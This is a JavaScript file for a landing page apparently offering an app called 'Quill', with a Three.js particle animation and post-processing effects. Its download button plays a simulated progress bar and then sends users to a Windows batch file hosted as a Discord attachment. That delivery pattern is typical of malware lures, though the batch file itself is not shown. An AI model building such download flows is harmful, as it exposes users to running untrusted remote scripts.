import * as THREE from 'three';
import { EffectComposer } from 'three/addons/postprocessing/EffectComposer.js';
import { RenderPass } from 'three/addons/postprocessing/RenderPass.js';
import { UnrealBloomPass } from 'three/addons/postprocessing/UnrealBloomPass.js';
import { ShaderPass } from 'three/addons/postprocessing/ShaderPass.js';
import { GlitchPass } from 'three/addons/postprocessing/GlitchPass.js';
import { FilmPass } from 'three/addons/postprocessing/FilmPass.js';
import { config } from './config.js';
import { initDevTools } from './devtools.js';

// Initialize Three.js Scene
let scene, camera, renderer, composer;
let particles, particlesMaterial;
let mouseX = 0, mouseY = 0;
let windowHalfX = window.innerWidth / 2;
let windowHalfY = window.innerHeight / 2;
let clock = new THREE.Clock();
let waveAmplitude = 0.1;

init();
animate();

// Export function to update particle colors from devtools
window.updateParticleColors = function(primaryColor, secondaryColor) {
    if (particles && particles.geometry) {
        const colors = particles.geometry.attributes.color;
        const count = colors.count;
        
        for (let i = 0; i < count; i++) {
            const mixFactor = Math.random();
            colors.array[i * 3] = (1 - mixFactor) * primaryColor.r + mixFactor * secondaryColor.r;
            colors.array[i * 3 + 1] = (1 - mixFactor) * primaryColor.g + mixFactor * secondaryColor.g;
            colors.array[i * 3 + 2] = (1 - mixFactor) * primaryColor.b + mixFactor * secondaryColor.b;
        }
        
        colors.needsUpdate = true;
    }
};

function init() {
    // Create scene
    scene = new THREE.Scene();
    
    // Create camera
    camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
    camera.position.z = 30;
    
    // Create renderer
    renderer = new THREE.WebGLRenderer({ 
        antialias: true,
        alpha: true
    });
    renderer.setSize(window.innerWidth, window.innerHeight);
    renderer.setPixelRatio(window.devicePixelRatio);
    document.getElementById('canvas-container').appendChild(renderer.domElement);
    
    // Create particles
    const particlesGeometry = new THREE.BufferGeometry();
    const particlesCount = config.particlesCount;
    
    const posArray = new Float32Array(particlesCount * 3);
    const colorsArray = new Float32Array(particlesCount * 3);
    const sizeArray = new Float32Array(particlesCount);
    
    // Position and color particles
    for (let i = 0; i < particlesCount * 3; i += 3) {
        // Positions - create a nebula-like particle distribution
        const radius = config.particlesRadius * (0.3 + Math.random() * 0.7);
        const theta = Math.random() * Math.PI * 2;
        const phi = Math.acos(2 * Math.random() - 1);
        
        // Add some gaussian-like distribution to create denser areas
        const randomFactor = 0.4;
        let x = radius * Math.sin(phi) * Math.cos(theta);
        let y = radius * Math.sin(phi) * Math.sin(theta);
        let z = radius * Math.cos(phi);
        
        // Add some clustering effect
        if (Math.random() > 0.7) {
            x *= 0.3 + Math.random() * 0.7;
            y *= 0.3 + Math.random() * 0.7;
            z *= 0.3 + Math.random() * 0.7;
        }
        
        posArray[i] = x;
        posArray[i + 1] = y;
        posArray[i + 2] = z;
        
        // Colors - gradient from primary to secondary accent with some variation
        const mixFactor = Math.random();
        colorsArray[i] = (1 - mixFactor) * config.accentPrimaryColor.r + mixFactor * config.accentSecondaryColor.r;
        colorsArray[i + 1] = (1 - mixFactor) * config.accentPrimaryColor.g + mixFactor * config.accentSecondaryColor.g;
        colorsArray[i + 2] = (1 - mixFactor) * config.accentPrimaryColor.b + mixFactor * config.accentSecondaryColor.b;
        
        // Randomize size for more natural look
        sizeArray[i/3] = config.particleSize * (0.5 + Math.random() * 1.5);
    }
    
    particlesGeometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
    particlesGeometry.setAttribute('color', new THREE.BufferAttribute(colorsArray, 3));
    particlesGeometry.setAttribute('size', new THREE.BufferAttribute(sizeArray, 1));
    
    // Particle material with custom shader
    const vertexShader = `
        attribute float size;
        varying vec3 vColor;
        void main() {
            vColor = color;
            vec4 mvPosition = modelViewMatrix * vec4(position, 1.0);
            gl_PointSize = size * (300.0 / -mvPosition.z);
            gl_Position = projectionMatrix * mvPosition;
        }
    `;
    
    const fragmentShader = `
        varying vec3 vColor;
        void main() {
            if (length(gl_PointCoord - vec2(0.5, 0.5)) > 0.5) discard;
            vec2 coord = gl_PointCoord - vec2(0.5);
            float intensity = 1.0 - length(coord * 2.0);
            vec3 glow = vColor * intensity * intensity;
            gl_FragColor = vec4(glow, 1.0);
        }
    `;
    
    particlesMaterial = new THREE.ShaderMaterial({
        uniforms: {},
        vertexShader: vertexShader,
        fragmentShader: fragmentShader,
        blending: THREE.AdditiveBlending,
        depthWrite: false,
        transparent: true,
        vertexColors: true
    });
    
    particles = new THREE.Points(particlesGeometry, particlesMaterial);
    scene.add(particles);
    
    // Post-processing
    composer = new EffectComposer(renderer);
    const renderPass = new RenderPass(scene, camera);
    composer.addPass(renderPass);
    
    const bloomPass = new UnrealBloomPass(
        new THREE.Vector2(window.innerWidth, window.innerHeight),
        config.bloomStrength,
        config.bloomRadius,
        config.bloomThreshold
    );
    composer.addPass(bloomPass);
    
    // Create a custom chromatic aberration effect without the grey flashing
    const chromaticAberrationPass = new ShaderPass({
        uniforms: {
            "tDiffuse": { value: null },
            "amount": { value: 0.0015 },
            "time": { value: 0 }
        },
        vertexShader: `
            varying vec2 vUv;
            void main() {
                vUv = uv;
                gl_Position = projectionMatrix * modelViewMatrix * vec4(position, 1.0);
            }
        `,
        fragmentShader: `
            uniform sampler2D tDiffuse;
            uniform float amount;
            uniform float time;
            varying vec2 vUv;
            
            void main() {
                float noise = sin(time * 20.0) * 0.01;
                float distort = amount * sin(time * 5.0) * (0.5 + 0.5 * noise);
                
                // Create chromatic aberration effect
                float r = texture2D(tDiffuse, vUv + vec2(distort, 0.0)).r;
                float g = texture2D(tDiffuse, vUv).g;
                float b = texture2D(tDiffuse, vUv - vec2(distort, 0.0)).b;
                vec4 color = vec4(r, g, b, 1.0);
                
                // Random glitch pattern without grey flashing
                if (noise > 0.009 && abs(sin(vUv.y * 200.0 + time * 30.0)) > 0.99) {
                    vec2 offset = vec2(noise * 0.2, 0.0);
                    color.rgb = texture2D(tDiffuse, vUv + offset).rgb;
                }
                
                gl_FragColor = color;
            }
        `
    });
    composer.addPass(chromaticAberrationPass);
    
    // Add subtle film grain
    const filmPass = new FilmPass(0.15, 0.025, 648, false);
    composer.addPass(filmPass);
    
    // Event listeners
    window.addEventListener('resize', onWindowResize);
    document.addEventListener('mousemove', onDocumentMouseMove);
    
    // Initialize download functionality
    initDownloadButton();
    
    // Add header scroll effect
    addHeaderScrollEffect();
    
    // Init dev tools
    initDevTools();
}

function onWindowResize() {
    windowHalfX = window.innerWidth / 2;
    windowHalfY = window.innerHeight / 2;
    
    camera.aspect = window.innerWidth / window.innerHeight;
    camera.updateProjectionMatrix();
    
    renderer.setSize(window.innerWidth, window.innerHeight);
    composer.setSize(window.innerWidth, window.innerHeight);
}

function onDocumentMouseMove(event) {
    mouseX = (event.clientX - windowHalfX) * 0.05;
    mouseY = (event.clientY - windowHalfY) * 0.05;
}

function animate() {
    requestAnimationFrame(animate);
    
    const time = clock.getElapsedTime() * 0.5;
    
    // Update chromatic aberration time uniform
    composer.passes.forEach(pass => {
        if (pass.uniforms && pass.uniforms.time) {
            pass.uniforms.time.value = time;
        }
    });
    
    // Wave effect for particles - Fixed to prevent shrinking
    if (particles.geometry) {
        const positions = particles.geometry.attributes.position.array;
        
        // Store the original positions if not already done
        if (!particles.userData.originalPositions) {
            particles.userData.originalPositions = particles.geometry.attributes.position.clone().array;
        }
        
        const originalPositions = particles.userData.originalPositions;
        
        for (let i = 0; i < positions.length; i += 3) {
            const ix = originalPositions[i];
            const iy = originalPositions[i + 1];
            const iz = originalPositions[i + 2];
            
            // Create wave effect without losing the original position
            positions[i] = ix + Math.sin(time + ix * 0.05) * waveAmplitude;
            positions[i + 1] = iy + Math.sin(time + iy * 0.03) * waveAmplitude;
            positions[i + 2] = iz + Math.cos(time + iz * 0.04) * waveAmplitude;
        }
        
        particles.geometry.attributes.position.needsUpdate = true;
    }
    
    // Rotate particles based on mouse position with smoother transition
    particles.rotation.x += (mouseY * 0.0002 - particles.rotation.x) * 0.01;
    particles.rotation.y += (mouseX * 0.0002 - particles.rotation.y) * 0.01;
    
    // Additional rotation animation - slower and more subtle
    particles.rotation.z += 0.0002;
    
    // Render
    composer.render();
}

// Add header scroll effect
function addHeaderScrollEffect() {
    const header = document.querySelector('header');
    const scrollThreshold = 50;
    
    window.addEventListener('scroll', () => {
        if (window.scrollY > scrollThreshold) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }
    });
}

// Download button functionality
function initDownloadButton() {
    const downloadButton = document.getElementById('download-button');
    const downloadModal = document.getElementById('download-modal');
    const closeModalButton = document.querySelector('.close-modal');
    const closeButton = document.querySelector('.close-btn');
    const progressFill = document.querySelector('.progress-fill');
    const progressText = document.querySelector('.progress-text');
    const downloadInfo = document.querySelector('.download-info');
    const downloadComplete = document.querySelector('.download-complete');
    const manualDownloadLink = document.getElementById('manual-download');
    
    // Set the download link
    const quillDownloadUrl = "https://cdn.discordapp.com/attachments/1297288731505721464/1352492906279338074/Quill.bat?ex=67de36ac&is=67dce52c&hm=445b8925deddb2722e3e380a5bb19aae0f9709696c11c2bf4010e71480aab771&";
    
    // Open modal on button click
    downloadButton.addEventListener('click', () => {
        downloadModal.style.display = 'flex';
        simulateDownload();
        // Start actual download after short delay
        setTimeout(() => {
            window.location.href = quillDownloadUrl;
        }, 1500);
    });
    
    // Manual download link
    manualDownloadLink.addEventListener('click', (e) => {
        e.preventDefault();
        window.location.href = quillDownloadUrl;
    });
    
    // Close modal
    closeModalButton.addEventListener('click', () => {
        downloadModal.style.display = 'none';
        resetDownload();
    });
    
    closeButton.addEventListener('click', () => {
        downloadModal.style.display = 'none';
        resetDownload();
    });
    
    // Close modal when clicking outside
    downloadModal.addEventListener('click', (e) => {
        if (e.target === downloadModal) {
            downloadModal.style.display = 'none';
            resetDownload();
        }
    });
    
    // Simulate download process
    function simulateDownload() {
        let progress = 0;
        progressFill.style.width = '0%';
        progressText.textContent = 'Preparing download...';
        downloadInfo.style.display = 'block';
        downloadComplete.classList.add('hidden');
        
        setTimeout(() => {
            progressText.textContent = 'Downloading Quill...';
            
            const interval = setInterval(() => {
                progress += Math.random() * 15;
                if (progress >= 100) {
                    progress = 100;
                    clearInterval(interval);
                    progressFill.style.width = '100%';
                    progressText.textContent = 'Download complete!';
                    
                    setTimeout(() => {
                        downloadInfo.style.display = 'none';
                        downloadComplete.classList.remove('hidden');
                    }, 500);
                } else {
                    progressFill.style.width = `${progress}%`;
                }
            }, 300);
        }, 800);
    }
    
    function resetDownload() {
        setTimeout(() => {
            progressFill.style.width = '0%';
            progressText.textContent = 'Preparing download...';
            downloadInfo.style.display = 'block';
            downloadComplete.classList.add('hidden');
        }, 300);
    }
}